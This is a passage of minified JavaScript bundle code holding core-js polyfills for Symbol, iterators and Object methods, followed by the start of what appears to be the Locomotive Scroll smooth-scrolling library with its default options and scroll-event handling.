      S = r(8),
      E = r(48),
      C = r(7),
      P = r(16),
      F = r(31),
      M = r(21),
      R = r(23),
      A = r(32),
      O = r(4),
      k = r(60),
      L = r(61),
      B = r(38),
      z = r(20),
      I = r(62).forEach,
      j = M("hidden"),
      V = O("toPrimitive"),
      N = z.set,
      U = z.getterFor("Symbol"),
      W = Object.prototype,
      H = n.Symbol,
      q = s("JSON", "stringify"),
      X = T.f,
      Y = S.f,
      G = b.f,
      K = E.f,
      Q = F("symbols"),
      Z = F("op-symbols"),
      $ = F("string-to-symbol-registry"),
      J = F("symbol-to-string-registry"),
      tt = F("wks"),
      et = n.QObject,
      rt = !et || !et.prototype || !et.prototype.findChild,
      it =
        a &&
        u(function () {
          return (
            7 !=
            y(
              Y({}, "a", {
                get: function () {
                  return Y(this, "a", { value: 7 }).a;
                },
              })
            ).a
          );
        })
          ? function (t, e, r) {
              var i = X(W, e);
              i && delete W[e], Y(t, e, r), i && t !== W && Y(W, e, i);
            }
          : Y,
      nt = function (t, e) {
        var r = (Q[t] = y(H.prototype));
        return (
          N(r, { type: "Symbol", tag: t, description: e }),
          a || (r.description = e),
          r
        );
      },
      st = h
        ? function (t) {
            return "symbol" == typeof t;
          }
        : function (t) {
            return Object(t) instanceof H;
          },
      ot = function (t, e, r) {
        t === W && ot(Z, e, r), f(t);
        var i = _(e, !0);
        return (
          f(r),
          c(Q, i)
            ? (r.enumerable
                ? (c(t, j) && t[j][i] && (t[j][i] = !1),
                  (r = y(r, { enumerable: v(0, !1) })))
                : (c(t, j) || Y(t, j, v(1, {})), (t[j][i] = !0)),
              it(t, i, r))
            : Y(t, i, r)
        );
      },
      at = function (t, e) {
        f(t);
        var r = m(e),
          i = D(r).concat(ct(r));
        return (
          I(i, function (e) {
            (a && !lt.call(r, e)) || ot(t, e, r[e]);
          }),
          t
        );
      },
      lt = function (t) {
        var e = _(t, !0),
          r = K.call(this, e);
        return (
          !(this === W && c(Q, e) && !c(Z, e)) &&
          (!(r || !c(this, e) || !c(Q, e) || (c(this, j) && this[j][e])) || r)
        );
      },
      ht = function (t, e) {
        var r = m(t),
          i = _(e, !0);
        if (r !== W || !c(Q, i) || c(Z, i)) {
          var n = X(r, i);
          return (
            !n || !c(Q, i) || (c(r, j) && r[j][i]) || (n.enumerable = !0), n
          );
        }
      },
      ut = function (t) {
        var e = G(m(t)),
          r = [];
        return (
          I(e, function (t) {
            c(Q, t) || c(R, t) || r.push(t);
          }),
          r
        );
      },
      ct = function (t) {
        var e = t === W,
          r = G(e ? Z : m(t)),
          i = [];
        return (
          I(r, function (t) {
            !c(Q, t) || (e && !c(W, t)) || i.push(Q[t]);
          }),
          i
        );
      };
    l ||
      (P(
        (H = function () {
          if (this instanceof H) throw TypeError("Symbol is not a constructor");
          var t =
              arguments.length && void 0 !== arguments[0]
                ? String(arguments[0])
                : void 0,
            e = A(t),
            r = function (t) {
              this === W && r.call(Z, t),
                c(this, j) && c(this[j], e) && (this[j][e] = !1),
                it(this, e, v(1, t));
            };
          return a && rt && it(W, e, { configurable: !0, set: r }), nt(e, t);
        }).prototype,
        "toString",
        function () {
          return U(this).tag;
        }
      ),
      P(H, "withoutSetter", function (t) {
        return nt(A(t), t);
      }),
      (E.f = lt),
      (S.f = ot),
      (T.f = ht),
      (x.f = b.f = ut),
      (w.f = ct),
      (k.f = function (t) {
        return nt(O(t), t);
      }),
      a &&
        (Y(H.prototype, "description", {
          configurable: !0,
          get: function () {
            return U(this).description;
          },
        }),
        o || P(W, "propertyIsEnumerable", lt, { unsafe: !0 }))),
      i({ global: !0, wrap: !0, forced: !l, sham: !l }, { Symbol: H }),
      I(D(tt), function (t) {
        L(t);
      }),
      i(
        { target: "Symbol", stat: !0, forced: !l },
        {
          for: function (t) {
            var e = String(t);
            if (c($, e)) return $[e];
            var r = H(e);
            return ($[e] = r), (J[r] = e), r;
          },
          keyFor: function (t) {
            if (!st(t)) throw TypeError(t + " is not a symbol");
            if (c(J, t)) return J[t];
          },
          useSetter: function () {
            rt = !0;
          },
          useSimple: function () {
            rt = !1;
          },
        }
      ),
      i(
        { target: "Object", stat: !0, forced: !l, sham: !a },
        {
          create: function (t, e) {
            return void 0 === e ? y(t) : at(y(t), e);
          },
          defineProperty: ot,
          defineProperties: at,
          getOwnPropertyDescriptor: ht,
        }
      ),
      i(
        { target: "Object", stat: !0, forced: !l },
        { getOwnPropertyNames: ut, getOwnPropertySymbols: ct }
      ),
      i(
        {
          target: "Object",
          stat: !0,
          forced: u(function () {
            w.f(1);
          }),
        },
        {
          getOwnPropertySymbols: function (t) {
            return w.f(g(t));
          },
        }
      ),
      q &&
        i(
          {
            target: "JSON",
            stat: !0,
            forced:
              !l ||
              u(function () {
                var t = H();
                return (
                  "[null]" != q([t]) ||
                  "{}" != q({ a: t }) ||
                  "{}" != q(Object(t))
                );
              }),
          },
          {
            stringify: function (t, e, r) {
              for (var i, n = [t], s = 1; arguments.length > s; )
                n.push(arguments[s++]);
              if (((i = e), (p(e) || void 0 !== t) && !st(t)))
                return (
                  d(e) ||
                    (e = function (t, e) {
                      if (
                        ("function" == typeof i && (e = i.call(this, t, e)),
                        !st(e))
                      )
                        return e;
                    }),
                  (n[1] = e),
                  q.apply(null, n)
                );
            },
          }
        ),
      H.prototype[V] || C(H.prototype, V, H.prototype.valueOf),
      B(H, "Symbol"),
      (R[j] = !0);
  },
  function (t, e) {
    var r;
    r = (function () {
      return this;
    })();
    try {
      r = r || new Function("return this")();
    } catch (t) {
      "object" == typeof window && (r = window);
    }
    t.exports = r;
  },
  function (t, e, r) {
    "use strict";
    var i = {}.propertyIsEnumerable,
      n = Object.getOwnPropertyDescriptor,
      s = n && !i.call({ 1: 2 }, 1);
    e.f = s
      ? function (t) {
          var e = n(this, t);
          return !!e && e.enumerable;
        }
      : i;
  },
  function (t, e, r) {
    var i = r(2),
      n = r(28),
      s = "".split;
    t.exports = i(function () {
      return !Object("z").propertyIsEnumerable(0);
    })
      ? function (t) {
          return "String" == n(t) ? s.call(t, "") : Object(t);
        }
      : Object;
  },
  function (t, e, r) {
    var i = r(11),
      n = r(2),
      s = r(51);
    t.exports =
      !i &&
      !n(function () {
        return (
          7 !=
          Object.defineProperty(s("div"), "a", {
            get: function () {
              return 7;
            },
          }).a
        );
      });
  },
  function (t, e, r) {
    var i = r(1),
      n = r(5),
      s = i.document,
      o = n(s) && n(s.createElement);
    t.exports = function (t) {
      return o ? s.createElement(t) : {};
    };
  },
  function (t, e, r) {
    var i = r(53),
      n = Function.toString;
    "function" != typeof i.inspectSource &&
      (i.inspectSource = function (t) {
        return n.call(t);
      }),
      (t.exports = i.inspectSource);
  },
  function (t, e, r) {
    var i = r(1),
      n = r(30),
      s = i["__core-js_shared__"] || n("__core-js_shared__", {});
    t.exports = s;
  },
  function (t, e, r) {
    var i = r(3),
      n = r(83),
      s = r(27),
      o = r(8);
    t.exports = function (t, e) {
      for (var r = n(e), a = o.f, l = s.f, h = 0; h < r.length; h++) {
        var u = r[h];
        i(t, u) || a(t, u, l(e, u));
      }
    };
  },
  function (t, e, r) {
    var i = r(1);
    t.exports = i;
  },
  function (t, e, r) {
    var i = r(3),
      n = r(13),
      s = r(84).indexOf,
      o = r(23);
    t.exports = function (t, e) {
      var r,
        a = n(t),
        l = 0,
        h = [];
      for (r in a) !i(o, r) && i(a, r) && h.push(r);
      for (; e.length > l; ) i(a, (r = e[l++])) && (~s(h, r) || h.push(r));
      return h;
    };
  },
  function (t, e) {
    e.f = Object.getOwnPropertySymbols;
  },
  function (t, e, r) {
    var i = r(37);
    t.exports = i && !Symbol.sham && "symbol" == typeof Symbol.iterator;
  },
  function (t, e, r) {
    var i = r(56),
      n = r(36);
    t.exports =
      Object.keys ||
      function (t) {
        return i(t, n);
      };
  },
  function (t, e, r) {
    var i = r(4);
    e.f = i;
  },
  function (t, e, r) {
    var i = r(55),
      n = r(3),
      s = r(60),
      o = r(8).f;
    t.exports = function (t) {
      var e = i.Symbol || (i.Symbol = {});
      n(e, t) || o(e, t, { value: s.f(t) });
    };
  },
  function (t, e, r) {
    var i = r(90),
      n = r(49),
      s = r(18),
      o = r(34),
      a = r(63),
      l = [].push,
      h = function (t) {
        var e = 1 == t,
          r = 2 == t,
          h = 3 == t,
          u = 4 == t,
          c = 6 == t,
          d = 5 == t || c;
        return function (p, f, g, m) {
          for (
            var _,
              v,
              y = s(p),
              D = n(y),
              x = i(f, g, 3),
              b = o(D.length),
              w = 0,
              T = m || a,
              S = e ? T(p, b) : r ? T(p, 0) : void 0;
            b > w;
            w++
          )
            if ((d || w in D) && ((v = x((_ = D[w]), w, y)), t))
              if (e) S[w] = v;
              else if (v)
                switch (t) {
                  case 3:
                    return !0;
                  case 5:
                    return _;
                  case 6:
                    return w;
                  case 2:
                    l.call(S, _);
                }
              else if (u) return !1;
          return c ? -1 : h || u ? u : S;
        };
      };
    t.exports = {
      forEach: h(0),
      map: h(1),
      filter: h(2),
      some: h(3),
      every: h(4),
      find: h(5),
      findIndex: h(6),
    };
  },
  function (t, e, r) {
    var i = r(5),
      n = r(24),
      s = r(4)("species");
    t.exports = function (t, e) {
      var r;
      return (
        n(t) &&
          ("function" != typeof (r = t.constructor) ||
          (r !== Array && !n(r.prototype))
            ? i(r) && null === (r = r[s]) && (r = void 0)
            : (r = void 0)),
        new (void 0 === r ? Array : r)(0 === e ? 0 : e)
      );
    };
  },
  function (t, e, r) {
    "use strict";
    var i = r(10),
      n = r(11),
      s = r(1),
      o = r(3),
      a = r(5),
      l = r(8).f,
      h = r(54),
      u = s.Symbol;
    if (
      n &&
      "function" == typeof u &&
      (!("description" in u.prototype) || void 0 !== u().description)
    ) {
      var c = {},
        d = function () {
          var t =
              arguments.length < 1 || void 0 === arguments[0]
                ? void 0
                : String(arguments[0]),
            e = this instanceof d ? new u(t) : void 0 === t ? u() : u(t);
          return "" === t && (c[e] = !0), e;
        };
      h(d, u);
      var p = (d.prototype = u.prototype);
      p.constructor = d;
      var f = p.toString,
        g = "Symbol(test)" == String(u("test")),
        m = /^Symbol\((.*)\)[^)]+$/;
      l(p, "description", {
        configurable: !0,
        get: function () {
          var t = a(this) ? this.valueOf() : this,
            e = f.call(t);
          if (o(c, t)) return "";
          var r = g ? e.slice(7, -1) : e.replace(m, "$1");
          return "" === r ? void 0 : r;
        },
      }),
        i({ global: !0, forced: !0 }, { Symbol: d });
    }
  },
  function (t, e, r) {
    r(61)("iterator");
  },
  function (t, e, r) {
    "use strict";
    var i = r(10),
      n = r(92),
      s = r(42),
      o = r(93),
      a = r(38),
      l = r(7),
      h = r(16),
      u = r(4),
      c = r(22),
      d = r(41),
      p = r(67),
      f = p.IteratorPrototype,
      g = p.BUGGY_SAFARI_ITERATORS,
      m = u("iterator"),
      _ = function () {
        return this;
      };
    t.exports = function (t, e, r, u, p, v, y) {
      n(r, e, u);
      var D,
        x,
        b,
        w = function (t) {
          if (t === p && P) return P;
          if (!g && t in E) return E[t];
          switch (t) {
            case "keys":
            case "values":
            case "entries":
              return function () {
                return new r(this, t);
              };
          }
          return function () {
            return new r(this);
          };
        },
        T = e + " Iterator",
        S = !1,
        E = t.prototype,
        C = E[m] || E["@@iterator"] || (p && E[p]),
        P = (!g && C) || w(p),
        F = ("Array" == e && E.entries) || C;
      if (
        (F &&
          ((D = s(F.call(new t()))),
          f !== Object.prototype &&
            D.next &&
            (c ||
              s(D) === f ||
              (o ? o(D, f) : "function" != typeof D[m] && l(D, m, _)),
            a(D, T, !0, !0),
            c && (d[T] = _))),
        "values" == p &&
          C &&
          "values" !== C.name &&
          ((S = !0),
          (P = function () {
            return C.call(this);
          })),
        (c && !y) || E[m] === P || l(E, m, P),
        (d[e] = P),
        p)
      )
        if (
          ((x = {
            values: w("values"),
            keys: v ? P : w("keys"),
            entries: w("entries"),
          }),
          y)
        )
          for (b in x) (g || S || !(b in E)) && h(E, b, x[b]);
        else i({ target: e, proto: !0, forced: g || S }, x);
      return x;
    };
  },
  function (t, e, r) {
    "use strict";
    var i,
      n,
      s,
      o = r(42),
      a = r(7),
      l = r(3),
      h = r(4),
      u = r(22),
      c = h("iterator"),
      d = !1;
    [].keys &&
      ("next" in (s = [].keys())
        ? (n = o(o(s))) !== Object.prototype && (i = n)
        : (d = !0)),
      null == i && (i = {}),
      u ||
        l(i, c) ||
        a(i, c, function () {
          return this;
        }),
      (t.exports = { IteratorPrototype: i, BUGGY_SAFARI_ITERATORS: d });
  },
  function (t, e, r) {
    var i = r(2);
    t.exports = !i(function () {
      function t() {}
      return (
        (t.prototype.constructor = null),
        Object.getPrototypeOf(new t()) !== t.prototype
      );
    });
  },
  function (t, e, r) {
    var i = r(10),
      n = r(2),
      s = r(18),
      o = r(42),
      a = r(68);
    i(
      {
        target: "Object",
        stat: !0,
        forced: n(function () {
          o(1);
        }),
        sham: !a,
      },
      {
        getPrototypeOf: function (t) {
          return o(s(t));
        },
      }
    );
  },
  function (t, e, r) {
    var i = r(43),
      n = r(16),
      s = r(95);
    i || n(Object.prototype, "toString", s, { unsafe: !0 });
  },
  function (t, e, r) {
    var i = r(10),
      n = r(17),
      s = r(39),
      o = r(9),
      a = r(5),
      l = r(25),
      h = r(97),
      u = r(2),
      c = n("Reflect", "construct"),
      d = u(function () {
        function t() {}
        return !(c(function () {}, [], t) instanceof t);
      }),
      p = !u(function () {
        c(function () {});
      }),
      f = d || p;
    i(
      { target: "Reflect", stat: !0, forced: f, sham: f },
      {
        construct: function (t, e) {
          s(t), o(e);
          var r = arguments.length < 3 ? t : s(arguments[2]);
          if (p && !d) return c(t, e, r);
          if (t == r) {
            switch (e.length) {
              case 0:
                return new t();
              case 1:
                return new t(e[0]);
              case 2:
                return new t(e[0], e[1]);
              case 3:
                return new t(e[0], e[1], e[2]);
              case 4:
                return new t(e[0], e[1], e[2], e[3]);
            }
            var i = [null];
            return i.push.apply(i, e), new (h.apply(t, i))();
          }
          var n = r.prototype,
            u = l(a(n) ? n : Object.prototype),
            f = Function.apply.call(t, u, e);
          return a(f) ? f : u;
        },
      }
    );
  },
  function (t, e, r) {
    "use strict";
    var i = r(16),
      n = r(9),
      s = r(2),
      o = r(98),
      a = RegExp.prototype,
      l = a.toString,
      h = s(function () {
        return "/a/b" != l.call({ source: "a", flags: "b" });
      }),
      u = "toString" != l.name;
    (h || u) &&
      i(
        RegExp.prototype,
        "toString",
        function () {
          var t = n(this),
            e = String(t.source),
            r = t.flags;
          return (
            "/" +
            e +
            "/" +
            String(
              void 0 === r && t instanceof RegExp && !("flags" in a)
                ? o.call(t)
                : r
            )
          );
        },
        { unsafe: !0 }
      );
  },
  function (t, e, r) {
    "use strict";
    var i = r(99).charAt,
      n = r(20),
      s = r(66),
      o = n.set,
      a = n.getterFor("String Iterator");
    s(
      String,
      "String",
      function (t) {
        o(this, { type: "String Iterator", string: String(t), index: 0 });
      },
      function () {
        var t,
          e = a(this),
          r = e.string,
          n = e.index;
        return n >= r.length
          ? { value: void 0, done: !0 }
          : ((t = i(r, n)), (e.index += t.length), { value: t, done: !1 });
      }
    );
  },
  function (t, e, r) {
    var i = r(1),
      n = r(75),
      s = r(40),
      o = r(7),
      a = r(4),
      l = a("iterator"),
      h = a("toStringTag"),
      u = s.values;
    for (var c in n) {
      var d = i[c],
        p = d && d.prototype;
      if (p) {
        if (p[l] !== u)
          try {
            o(p, l, u);
          } catch (t) {
            p[l] = u;
          }
        if ((p[h] || o(p, h, c), n[c]))
          for (var f in s)
            if (p[f] !== s[f])
              try {
                o(p, f, s[f]);
              } catch (t) {
                p[f] = s[f];
              }
      }
    }
  },
  function (t, e) {
    t.exports = {
      CSSRuleList: 0,
      CSSStyleDeclaration: 0,
      CSSValueList: 0,
      ClientRectList: 0,
      DOMRectList: 0,
      DOMStringList: 0,
      DOMTokenList: 1,
      DataTransferItemList: 0,
      FileList: 0,
      HTMLAllCollection: 0,
      HTMLCollection: 0,
      HTMLFormElement: 0,
      HTMLSelectElement: 0,
      MediaList: 0,
      MimeTypeArray: 0,
      NamedNodeMap: 0,
      NodeList: 1,
      PaintRequestList: 0,
      Plugin: 0,
      PluginArray: 0,
      SVGLengthList: 0,
      SVGNumberList: 0,
      SVGPathSegList: 0,
      SVGPointList: 0,
      SVGStringList: 0,
      SVGTransformList: 0,
      SourceBufferList: 0,
      StyleSheetList: 0,
      TextTrackCueList: 0,
      TextTrackList: 0,
      TouchList: 0,
    };
  },
  function (t, e, r) {
    "use strict";
    var i = r(62).forEach,
      n = r(100),
      s = r(101),
      o = n("forEach"),
      a = s("forEach");
    t.exports =
      o && a
        ? [].forEach
        : function (t) {
            return i(this, t, arguments.length > 1 ? arguments[1] : void 0);
          };
  },
  function (t, e, r) {
    "use strict";
    var i = r(10),
      n = r(2),
      s = r(24),
      o = r(5),
      a = r(18),
      l = r(34),
      h = r(103),
      u = r(63),
      c = r(104),
      d = r(4),
      p = r(78),
      f = d("isConcatSpreadable"),
      g =
        p >= 51 ||
        !n(function () {
          var t = [];
          return (t[f] = !1), t.concat()[0] !== t;
        }),
      m = c("concat"),
      _ = function (t) {
        if (!o(t)) return !1;
        var e = t[f];
        return void 0 !== e ? !!e : s(t);
      };
    i(
      { target: "Array", proto: !0, forced: !g || !m },
      {
        concat: function (t) {
          var e,
            r,
            i,
            n,
            s,
            o = a(this),
            c = u(o, 0),
            d = 0;
          for (e = -1, i = arguments.length; e < i; e++)
            if (_((s = -1 === e ? o : arguments[e]))) {
              if (d + (n = l(s.length)) > 9007199254740991)
                throw TypeError("Maximum allowed index exceeded");
              for (r = 0; r < n; r++, d++) r in s && h(c, d, s[r]);
            } else {
              if (d >= 9007199254740991)
                throw TypeError("Maximum allowed index exceeded");
              h(c, d++, s);
            }
          return (c.length = d), c;
        },
      }
    );
  },
  function (t, e, r) {
    var i,
      n,
      s = r(1),
      o = r(105),
      a = s.process,
      l = a && a.versions,
      h = l && l.v8;
    h
      ? (n = (i = h.split("."))[0] + i[1])
      : o &&
        (!(i = o.match(/Edge\/(\d+)/)) || i[1] >= 74) &&
        (i = o.match(/Chrome\/(\d+)/)) &&
        (n = i[1]),
      (t.exports = n && +n);
  },
  function (t, e, r) {
    "use strict";
    (function (t) {
      function r(t, e) {
        if (!(t instanceof e))
          throw new TypeError("Cannot call a class as a function");
      }
      function i(t, e) {
        for (var r = 0; r < e.length; r++) {
          var i = e[r];
          (i.enumerable = i.enumerable || !1),
            (i.configurable = !0),
            "value" in i && (i.writable = !0),
            Object.defineProperty(t, i.key, i);
        }
      }
      function n(t, e, r) {
        return e && i(t.prototype, e), r && i(t, r), t;
      }
      function s(t, e, r) {
        return (
          e in t
            ? Object.defineProperty(t, e, {
                value: r,
                enumerable: !0,
                configurable: !0,
                writable: !0,
              })
            : (t[e] = r),
          t
        );
      }
      function o(t, e) {
        var r = Object.keys(t);
        if (Object.getOwnPropertySymbols) {
          var i = Object.getOwnPropertySymbols(t);
          e &&
            (i = i.filter(function (e) {
              return Object.getOwnPropertyDescriptor(t, e).enumerable;
            })),
            r.push.apply(r, i);
        }
        return r;
      }
      function a(t) {
        for (var e = 1; e < arguments.length; e++) {
          var r = null != arguments[e] ? arguments[e] : {};
          e % 2
            ? o(Object(r), !0).forEach(function (e) {
                s(t, e, r[e]);
              })
            : Object.getOwnPropertyDescriptors
            ? Object.defineProperties(t, Object.getOwnPropertyDescriptors(r))
            : o(Object(r)).forEach(function (e) {
                Object.defineProperty(
                  t,
                  e,
                  Object.getOwnPropertyDescriptor(r, e)
                );
              });
        }
        return t;
      }
      function l(t, e) {
        if ("function" != typeof e && null !== e)
          throw new TypeError(
            "Super expression must either be null or a function"
          );
        (t.prototype = Object.create(e && e.prototype, {
          constructor: { value: t, writable: !0, configurable: !0 },
        })),
          e && u(t, e);
      }
      function h(t) {
        return (h = Object.setPrototypeOf
          ? Object.getPrototypeOf
          : function (t) {
              return t.__proto__ || Object.getPrototypeOf(t);
            })(t);
      }
      function u(t, e) {
        return (u =
          Object.setPrototypeOf ||
          function (t, e) {
            return (t.__proto__ = e), t;
          })(t, e);
      }
      function c(t) {
        if (void 0 === t)
          throw new ReferenceError(
            "this hasn't been initialised - super() hasn't been called"
          );
        return t;
      }
      function p(t) {
        var e = (function () {
          if ("undefined" == typeof Reflect || !Reflect.construct) return !1;
          if (Reflect.construct.sham) return !1;
          if ("function" == typeof Proxy) return !0;
          try {
            return (
              Date.prototype.toString.call(
                Reflect.construct(Date, [], function () {})
              ),
              !0
            );
          } catch (t) {
            return !1;
          }
        })();
        return function () {
          var r,
            i = h(t);
          if (e) {
            var n = h(this).constructor;
            r = Reflect.construct(i, arguments, n);
          } else r = i.apply(this, arguments);
          return (function d(t, e) {
            return !e || ("object" != typeof e && "function" != typeof e)
              ? c(t)
              : e;
          })(this, r);
        };
      }
      function f(t, e, r) {
        return (f =
          "undefined" != typeof Reflect && Reflect.get
            ? Reflect.get
            : function (t, e, r) {
                var i = (function (t, e) {
                  for (
                    ;
                    !Object.prototype.hasOwnProperty.call(t, e) &&
                    null !== (t = h(t));

                  );
                  return t;
                })(t, e);
                if (i) {
                  var n = Object.getOwnPropertyDescriptor(i, e);
                  return n.get ? n.get.call(r) : n.value;
                }
              })(t, e, r || t);
      }
      function g(t, e) {
        return (
          (function (t) {
            if (Array.isArray(t)) return t;
          })(t) ||
          (function (t, e) {
            if ("undefined" != typeof Symbol && Symbol.iterator in Object(t)) {
              var r = [],
                i = !0,
                n = !1,
                s = void 0;
              try {
                for (
                  var o, a = t[Symbol.iterator]();
                  !(i = (o = a.next()).done) &&
                  (r.push(o.value), !e || r.length !== e);
                  i = !0
                );
              } catch (t) {
                (n = !0), (s = t);
              } finally {
                try {
                  i || null == a.return || a.return();
                } finally {
                  if (n) throw s;
                }
              }
              return r;
            }
          })(t, e) ||
          _(t, e) ||
          (function () {
            throw new TypeError(
              "Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method."
            );
          })()
        );
      }
      function m(t) {
        return (
          (function (t) {
            if (Array.isArray(t)) return v(t);
          })(t) ||
          (function (t) {
            if ("undefined" != typeof Symbol && Symbol.iterator in Object(t))
              return Array.from(t);
          })(t) ||
          _(t) ||
          (function () {
            throw new TypeError(
              "Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method."
            );
          })()
        );
      }
      function _(t, e) {
        if (t) {
          if ("string" == typeof t) return v(t, e);
          var r = Object.prototype.toString.call(t).slice(8, -1);
          return (
            "Object" === r && t.constructor && (r = t.constructor.name),
            "Map" === r || "Set" === r
              ? Array.from(t)
              : "Arguments" === r ||
                /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(r)
              ? v(t, e)
              : void 0
          );
        }
      }
      function v(t, e) {
        (null == e || e > t.length) && (e = t.length);
        for (var r = 0, i = new Array(e); r < e; r++) i[r] = t[r];
        return i;
      }
      var y = {
          el: document,
          name: "scroll",
          offset: [0, 0],
          repeat: !1,
          smooth: !1,
          initPosition: { x: 0, y: 0 },
          direction: "vertical",
          gestureDirection: "vertical",
          reloadOnContextChange: !1,
          lerp: 0.1,
          class: "is-inview",
          scrollbarContainer: !1,
          scrollbarClass: "c-scrollbar",
          scrollingClass: "has-scroll-scrolling",
          draggingClass: "has-scroll-dragging",
          smoothClass: "has-scroll-smooth",
          initClass: "has-scroll-init",
          getSpeed: !1,
          getDirection: !1,
          scrollFromAnywhere: !1,
          multiplier: 1,
          firefoxMultiplier: 50,
          touchMultiplier: 2,
          resetNativeScroll: !0,
          tablet: {
            smooth: !1,
            direction: "vertical",
            gestureDirection: "vertical",
            breakpoint: 1024,
          },
          smartphone: {
            smooth: !1,
            direction: "vertical",
            gestureDirection: "vertical",
          },
        },
        D = (function () {
          function t() {
            var e =
              arguments.length > 0 && void 0 !== arguments[0]
                ? arguments[0]
                : {};
            r(this, t),
              Object.assign(this, y, e),
              (this.smartphone = y.smartphone),
              e.smartphone && Object.assign(this.smartphone, e.smartphone),
              (this.tablet = y.tablet),
              e.tablet && Object.assign(this.tablet, e.tablet),
              (this.namespace = "locomotive"),
              (this.html = document.documentElement),
              (this.windowHeight = window.innerHeight),
              (this.windowWidth = window.innerWidth),
              (this.windowMiddle = {
                x: this.windowWidth / 2,
                y: this.windowHeight / 2,
              }),
              (this.els = {}),
              (this.currentElements = {}),
              (this.listeners = {}),
              (this.hasScrollTicking = !1),
              (this.hasCallEventSet = !1),
              (this.checkScroll = this.checkScroll.bind(this)),
              (this.checkResize = this.checkResize.bind(this)),
              (this.checkEvent = this.checkEvent.bind(this)),
              (this.instance = {
                scroll: { x: 0, y: 0 },
                limit: { x: this.html.offsetHeight, y: this.html.offsetHeight },
                currentElements: this.currentElements,
              }),
              this.isMobile
                ? this.isTablet
                  ? (this.context = "tablet")
                  : (this.context = "smartphone")
                : (this.context = "desktop"),
              this.isMobile && (this.direction = this[this.context].direction),
              "horizontal" === this.direction
                ? (this.directionAxis = "x")
                : (this.directionAxis = "y"),
              this.getDirection && (this.instance.direction = null),
              this.getDirection && (this.instance.speed = 0),
              this.html.classList.add(this.initClass),
              window.addEventListener("resize", this.checkResize, !1);
          }
          return (
            n(t, [
              {
                key: "init",
                value: function () {
                  this.initEvents();
                },
              },
              {
                key: "checkScroll",
                value: function () {
                  this.dispatchScroll();
                },
              },
              {
                key: "checkResize",
                value: function () {
                  var t = this;
                  this.resizeTick ||
                    ((this.resizeTick = !0),
                    requestAnimationFrame(function () {
                      t.resize(), (t.resizeTick = !1);
                    }));
                },
              },
              { key: "resize", value: function () {} },
              {
                key: "checkContext",
                value: function () {
                  if (this.reloadOnContextChange) {
                    (this.isMobile =
                      /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
                        navigator.userAgent
                      ) ||
                      ("MacIntel" === navigator.platform &&
                        navigator.maxTouchPoints > 1) ||
                      this.windowWidth < this.tablet.breakpoint),
                      (this.isTablet =
                        this.isMobile &&
                        this.windowWidth >= this.tablet.breakpoint);
                    var t = this.context;
                    this.isMobile
                      ? this.isTablet
                        ? (this.context = "tablet")
                        : (this.context = "smartphone")
                      : (this.context = "desktop"),
                      t != this.context &&
                        ("desktop" == t ? this.smooth : this[t].smooth) !=
                          ("desktop" == this.context
                            ? this.smooth
                            : this[this.context].smooth) &&
                        window.location.reload();
                  }
                },
              },
              {
                key: "initEvents",
                value: function () {
                  var t = this;
                  (this.scrollToEls = this.el.querySelectorAll(
                    "[data-".concat(this.name, "-to]")
                  )),
                    (this.setScrollTo = this.setScrollTo.bind(this)),
                    this.scrollToEls.forEach(function (e) {
                      e.addEventListener("click", t.setScrollTo, !1);
                    });
                },
              },
              {
                key: "setScrollTo",
                value: function (t) {
                  t.preventDefault(),
                    this.scrollTo(
                      t.currentTarget.getAttribute(
                        "data-".concat(this.name, "-href")
                      ) || t.currentTarget.getAttribute("href"),
                      {
                        offset: t.currentTarget.getAttribute(
                          "data-".concat(this.name, "-offset")
                        ),
                      }
                    );
                },
              },
              { key: "addElements", value: function () {} },
              {
                key: "detectElements",
                value: function (t) {
                  var e = this,
                    r = this.instance.scroll.y,
                    i = r + this.windowHeight,
                    n = this.instance.scroll.x,
                    s = n + this.windowWidth;
                  Object.entries(this.els).forEach(function (o) {
                    var a = g(o, 2),
                      l = a[0],
                      h = a[1];
                    if (
                      (!h ||
                        (h.inView && !t) ||
                        ("horizontal" === e.direction
                          ? s >= h.left && n < h.right && e.setInView(h, l)
                          : i >= h.top && r < h.bottom && e.setInView(h, l)),
                      h && h.inView)
                    )
                      if ("horizontal" === e.direction) {
                        var u = h.right - h.left;
                        (h.progress =
                          (e.instance.scroll.x - (h.left - e.windowWidth)) /
                          (u + e.windowWidth)),
                          (s < h.left || n > h.right) && e.setOutOfView(h, l);
                      } else {
                        var c = h.bottom - h.top;
                        (h.progress =
                          (e.instance.scroll.y - (h.top - e.windowHeight)) /
                          (c + e.windowHeight)),
                          (i < h.top || r > h.bottom) && e.setOutOfView(h, l);
                      }
                  }),
                    (this.hasScrollTicking = !1);
                },
              },
              {
                key: "setInView",
                value: function (t, e) {
                  (this.els[e].inView = !0),
                    t.el.classList.add(t.class),
                    (this.currentElements[e] = t),
                    t.call &&
                      this.hasCallEventSet &&
                      (this.dispatchCall(t, "enter"),
                      t.repeat || (this.els[e].call = !1));
                },
              },
              {
                key: "setOutOfView",
                value: function (t, e) {
                  var r = this;
                  (this.els[e].inView = !1),
                    Object.keys(this.currentElements).forEach(function (t) {
                      t === e && delete r.currentElements[t];
                    }),
                    t.call &&
                      this.hasCallEventSet &&
                      this.dispatchCall(t, "exit"),
                    t.repeat && t.el.classList.remove(t.class);
                },
              },
              {
                key: "dispatchCall",
                value: function (t, e) {
                  (this.callWay = e),
                    (this.callValue = t.call.split(",").map(function (t) {
                      return t.trim();
                    })),
                    (this.callObj = t),
                    1 == this.callValue.length &&
                      (this.callValue = this.callValue[0]);
                  var r = new Event(this.namespace + "call");
                  this.el.dispatchEvent(r);
                },
              },
              {
                key: "dispatchScroll",
                value: function () {
                  var t = new Event(this.namespace + "scroll");
                  this.el.dispatchEvent(t);
                },
              },
              {
                key: "setEvents",
                value: function (t, e) {
                  this.listeners[t] || (this.listeners[t] = []);
                  var r = this.listeners[t];
                  r.push(e),
                    1 === r.length &&
                      this.el.addEventListener(
                        this.namespace + t,
                        this.checkEvent,
                        !1
                      ),
                    "call" === t &&
                      ((this.hasCallEventSet = !0), this.detectElements(!0));
                },
              },
              {
                key: "unsetEvents",
                value: function (t, e) {
                  if (this.listeners[t]) {
                    var r = this.listeners[t],
                      i = r.indexOf(e);
                    i < 0 ||
                      (r.splice(i, 1),
                      0 === r.index &&
                        this.el.removeEventListener(
                          this.namespace + t,
                          this.checkEvent,
